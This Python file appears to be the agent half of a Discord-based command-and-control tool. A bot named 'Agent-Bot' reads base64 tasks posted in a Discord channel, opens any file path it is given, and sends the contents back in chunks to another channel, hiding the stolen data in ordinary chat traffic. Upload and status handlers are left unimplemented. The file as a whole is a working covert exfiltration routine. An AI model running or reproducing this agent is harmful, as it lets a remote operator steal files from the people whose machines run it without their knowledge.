import base64
import hashlib
import discord
from template_parser import DiscordTemplateParser as TemplateParser
from task import TaskingObject, TransferType
from data_chunker import DataChunker

client = discord.Client()

client.TEMPLATE = None
client.TASK_ID = 1


@client.event
async def on_ready():
    print("Agent-Bot is ready!")


@client.event
async def on_message(message):
    if message.channel.id == client.TEMPLATE.client_channel:
        serialized_task = base64.b64decode(message.content.encode())
        task = TaskingObject.deserialize(serialized_task)

        # FILE TRANSFER
        if task.type == TransferType.FILE_TRANSFER.value:
            await file_transfer(task)

        # FILE UPLOAD
        elif task.type == TransferType.FILE_UPLOAD.value:
            await file_upload(task)

        # STATUS REQUEST
        elif task.type == TransferType.STATUS_REQUEST.value:
            await status_request(task)

        else:
            return


async def file_transfer(task):
    file_path = task.data
    file_path_str = file_path.decode()

    try:
        my_file = open(file_path_str, "rb")
        my_file_content = my_file.read()
        my_file.close()
        task.data = my_file_content
        md5Hashed = hashlib.md5(my_file_content).hexdigest()

        print(
            f" File '{md5Hashed}' succesfully found under '{file_path_str}' and read!"
        )
        print()
    except Exception:
        task.data = b"-1"
        print(f" File under '{file_path_str}' has not been found!")
        print()

    # POST
    channel = client.get_channel(client.TEMPLATE.server_channel)
    data_chunker = DataChunker(
        max_chunk_size=client.TEMPLATE.max_chunk_size,
        min_chunk_size=client.TEMPLATE.min_chunk_size,
        payload_percentage=client.TEMPLATE.payload_percentage,
    )
    serialized_task = TaskingObject.serialize(task)
    serialized_task_b64 = base64.b64encode(serialized_task)

    post_array = data_chunker.chunk_data(serialized_task_b64)
    i = 1
    task_id = client.TASK_ID
    client.TASK_ID = client.TASK_ID + 1
    print(f"Let's start with transfering Task {task_id}")
    print()
    for chunk in post_array:
        print(f"{task_id} -  chunk {i} / {len(post_array)}")
        print()
        i = i + 1
        await channel.send(f"{chunk.decode()}")


async def file_upload(task):
    # to be implemented
    return


async def status_request(task):
    # to be implemented
    return


my_file = open(
    "../assets/discord_template.xml",
    "rb",
)
my_file_content = my_file.read()
client.TEMPLATE = TemplateParser.parse_template(my_file_content)[0]
client.run(client.TEMPLATE.client_token)
